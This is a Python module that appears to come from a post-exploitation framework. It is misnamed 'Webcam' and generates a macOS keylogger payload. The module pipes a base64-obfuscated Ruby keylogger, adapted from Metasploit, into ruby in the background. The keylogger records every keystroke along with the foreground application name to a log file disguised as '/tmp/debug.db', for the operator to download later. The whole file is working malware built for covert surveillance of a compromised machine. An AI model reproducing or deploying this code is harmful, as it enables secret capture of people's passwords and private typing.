class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Webcam',

            # list of one or more authors for the module
            'Author': ['joev', '@harmj0y'],

            # more verbose multi-line description of the module
            'Description': ("Logs keystrokes to the specified file. Ruby based and heavily adapted from MSF's osx/capture/keylog_recorder. Kill the resulting PID when keylogging is finished and download the specified LogFile."),

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': "",

            # if the module needs administrative privileges
            'NeedsAdmin': False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': [
                "https://github.com/amoffat/pykeylogger"
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to keylog.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'LogFile': {
                'Description'   :   'Text file to log keystrokes out to.',
                'Required'      :   True,
                'Value'         :   '/tmp/debug.db'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        logFile = self.options['LogFile']['Value']

        # base64'ed launcher of ./data/misc/keylogger.rb from MSF
        script = """
import os,time
output = os.popen('echo "require \\\'base64\\\';eval(Base64.decode64(\\\'cmVxdWlyZSAndGhyZWFkJwpyZXF1aXJlICdkbCcKcmVxdWlyZSAnZGwvaW1wb3J0JwpJbXBvcnRlciA9IGlmIGRlZmluZWQ/KERMOjpJbXBvcnRlcikgdGhlbiBETDo6SW1wb3J0ZXIgZWxzZSBETDo6SW1wb3J0YWJsZSBlbmQKZGVmIHJ1YnlfMV85X29yX2hpZ2hlcj8KICBSVUJZX1ZFUlNJT04udG9fZiA+PSAxLjkKZW5kCmRlZiBtYWxsb2Moc2l6ZSkKICBpZiBydWJ5XzFfOV9vcl9oaWdoZXI/CiAgICBETDo6Q1B0ci5tYWxsb2Moc2l6ZSkKICBlbHNlCiAgICBETDo6bWFsbG9jKHNpemUpCiAgZW5kCmVuZAppZiBub3QgcnVieV8xXzlfb3JfaGlnaGVyPwogIG1vZHVsZSBETAogICAgbW9kdWxlIEltcG9ydGFibGUKICAgICAgZGVmIG1ldGhvZF9taXNzaW5nKG1ldGgsICphcmdzLCAmYmxvY2spCiAgICAgICAgc3RyID0gbWV0aC50b19zCiAgICAgICAgbG93ZXIgPSBzdHJbMCwxXS5kb3duY2FzZSArIHN0clsxLi4tMV0KICAgICAgICBpZiBzZWxmLnJlc3BvbmRfdG8/IGxvd2VyCiAgICAgICAgICBzZWxmLnNlbmQgbG93ZXIsICphcmdzCiAgICAgICAgZWxzZQogICAgICAgICAgc3VwZXIKICAgICAgICBlbmQKICAgICAgZW5kCiAgICBlbmQKICBlbmQKZW5kClNNX0tDSFJfQ0FDSEUgPSAzOApTTV9DVVJSRU5UX1NDUklQVCA9IC0yCk1BWF9BUFBfTkFNRSA9IDgwCm1vZHVsZSBDYXJib24KICBleHRlbmQgSW1wb3J0ZXIKICBkbGxvYWQgJy9TeXN0ZW0vTGlicmFyeS9GcmFtZXdvcmtzL0NhcmJvbi5mcmFtZXdvcmsvQ2FyYm9uJwogIGV4dGVybiAndW5zaWduZWQgbG9uZyBDb3B5UHJvY2Vzc05hbWUoY29uc3QgUHJvY2Vzc1NlcmlhbE51bWJlciAqLCB2b2lkICopJwogIGV4dGVybiAndm9pZCBHZXRGcm9udFByb2Nlc3MoUHJvY2Vzc1NlcmlhbE51bWJlciAqKScKICBleHRlcm4gJ3ZvaWQgR2V0S2V5cyh2b2lkICopJwogIGV4dGVybiAndW5zaWduZWQgY2hhciAqR2V0U2NyaXB0VmFyaWFibGUoaW50LCBpbnQpJwogIGV4dGVybiAndW5zaWduZWQgY2hhciBLZXlUcmFuc2xhdGUodm9pZCAqLCBpbnQsIHZvaWQgKiknCiAgZXh0ZXJuICd1bnNpZ25lZCBjaGFyIENGU3RyaW5nR2V0Q1N0cmluZyh2b2lkICosIHZvaWQgKiwgaW50LCBpbnQpJwogIGV4dGVybiAnaW50IENGU3RyaW5nR2V0TGVuZ3RoKHZvaWQgKiknCmVuZApwc24gPSBtYWxsb2MoMTYpCm5hbWUgPSBtYWxsb2MoMTYpCm5hbWVfY3N0ciA9IG1hbGxvYyhNQVhfQVBQX05BTUUpCmtleW1hcCA9IG1hbGxvYygxNikKc3RhdGUgPSBtYWxsb2MoOCkKaXR2X3N0YXJ0ID0gVGltZS5ub3cudG9faQpwcmV2X2Rvd24gPSBIYXNoLm5ldyhmYWxzZSkKbGFzdFdpbmRvdyA9ICIiCndoaWxlICh0cnVlKSBkbwogIENhcmJvbi5HZXRGcm9udFByb2Nlc3MocHNuLnJlZikKICBDYXJib24uQ29weVByb2Nlc3NOYW1lKHBzbi5yZWYsIG5hbWUucmVmKQogIENhcmJvbi5HZXRLZXlzKGtleW1hcCkKICBzdHJfbGVuID0gQ2FyYm9uLkNGU3RyaW5nR2V0TGVuZ3RoKG5hbWUpCiAgY29waWVkID0gQ2FyYm9uLkNGU3RyaW5nR2V0Q1N0cmluZyhuYW1lLCBuYW1lX2NzdHIsIE1BWF9BUFBfTkFNRSwgMHgwODAwMDEwMCkgPiAwCiAgYXBwX25hbWUgPSBpZiBjb3BpZWQgdGhlbiBuYW1lX2NzdHIudG9fcyBlbHNlICdVbmtub3duJyBlbmQKICBieXRlcyA9IGtleW1hcC50b19zdHIKICBjYXBfZmxhZyA9IGZhbHNlCiAgYXNjaWkgPSAwCiAgY3RybGNoYXIgPSAiIgogICgwLi4uMTI4KS5lYWNoIGRvIHxrfAogICAgaWYgKChieXRlc1trPj4zXS5vcmQgPj4gKGsmNykpICYgMSA+IDApCiAgICAgIGlmIG5vdCBwcmV2X2Rvd25ba10KICAgICAgICBjYXNlIGsKICAgICAgICAgIHdoZW4gMzYKICAgICAgICAgICAgY3RybGNoYXIgPSAiW2VudGVyXSIKICAgICAgICAgIHdoZW4gNDgKICAgICAgICAgICAgY3RybGNoYXIgPSAiW3RhYl0iCiAgICAgICAgICB3aGVuIDQ5CiAgICAgICAgICAgIGN0cmxjaGFyID0gIiAiCiAgICAgICAgICB3aGVuIDUxCiAgICAgICAgICAgIGN0cmxjaGFyID0gIltkZWxldGVdIgogICAgICAgICAgd2hlbiA1MwogICAgICAgICAgICBjdHJsY2hhciA9ICJbZXNjXSIKICAgICAgICAgIHdoZW4gNTUKICAgICAgICAgICAgY3RybGNoYXIgPSAiW2NtZF0iCiAgICAgICAgICB3aGVuIDU2CiAgICAgICAgICAgIGN0cmxjaGFyID0gIltzaGlmdF0iCiAgICAgICAgICB3aGVuIDU3CiAgICAgICAgICAgIGN0cmxjaGFyID0gIltjYXBzXSIKICAgICAgICAgIHdoZW4gNTgKICAgICAgICAgICAgY3RybGNoYXIgPSAiW29wdGlvbl0iCiAgICAgICAgICB3aGVuIDU5CiAgICAgICAgICAgIGN0cmxjaGFyID0gIltjdHJsXSIKICAgICAgICAgIHdoZW4gNjMKICAgICAgICAgICAgY3RybGNoYXIgPSAiW2ZuXSIKICAgICAgICAgIGVsc2UKICAgICAgICAgICAgY3RybGNoYXIgPSAiIgogICAgICAgIGVuZAogICAgICAgIGlmIGN0cmxjaGFyID09ICIiIGFuZCBhc2NpaSA9PSAwCiAgICAgICAgICBrY2hyID0gQ2FyYm9uLkdldFNjcmlwdFZhcmlhYmxlKFNNX0tDSFJfQ0FDSEUsIFNNX0NVUlJFTlRfU0NSSVBUKQogICAgICAgICAgY3Vycl9hc2NpaSA9IENhcmJvbi5LZXlUcmFuc2xhdGUoa2Nociwgaywgc3RhdGUpCiAgICAgICAgICBjdXJyX2FzY2lpID0gY3Vycl9hc2NpaSA+PiAxNiBpZiBjdXJyX2FzY2lpIDwgMQogICAgICAgICAgcHJldl9kb3duW2tdID0gdHJ1ZQogICAgICAgICAgaWYgY3Vycl9hc2NpaSA9PSAwCiAgICAgICAgICAgIGNhcF9mbGFnID0gdHJ1ZQogICAgICAgICAgZWxzZQogICAgICAgICAgICBhc2NpaSA9IGN1cnJfYXNjaWkKICAgICAgICAgIGVuZAogICAgICAgIGVsc2lmIGN0cmxjaGFyICE9ICIiCiAgICAgICAgICBwcmV2X2Rvd25ba10gPSB0cnVlCiAgICAgICAgZW5kCiAgICAgIGVuZAogICAgZWxzZQogICAgICBwcmV2X2Rvd25ba10gPSBmYWxzZQogICAgZW5kCiAgZW5kCiAgaWYgYXNjaWkgIT0gMCBvciBjdHJsY2hhciAhPSAiIgogICAgaWYgYXBwX25hbWUgIT0gbGFzdFdpbmRvdwogICAgICBwdXRzICJcblxuWyN7YXBwX25hbWV9XSAtIFsje1RpbWUubm93fV1cbiIKICAgICAgbGFzdFdpbmRvdyA9IGFwcF9uYW1lCiAgICBlbmQKICAgIGlmIGN0cmxjaGFyICE9ICIiCiAgICAgIHByaW50ICIje2N0cmxjaGFyfSIKICAgIGVsc2lmIGFzY2lpID4gMzIgYW5kIGFzY2lpIDwgMTI3CiAgICAgIGMgPSBpZiBjYXBfZmxhZyB0aGVuIGFzY2lpLmNoci51cGNhc2UgZWxzZSBhc2NpaS5jaHIgZW5kCiAgICAgIHByaW50ICIje2N9IgogICAgZWxzZQogICAgICBwcmludCAiWyN7YXNjaWl9XSIKICAgIGVuZAogICAgJHN0ZG91dC5mbHVzaAogIGVuZAogIEtlcm5lbC5zbGVlcCgwLjAxKQplbmQK\\\'))" | ruby > %s &').read()
time.sleep(1)
pids = os.popen('ps aux | grep " ruby" | grep -v grep').read()
print pids
print "kill ruby PID and download %s when completed"
""" % (logFile, logFile)

        return script
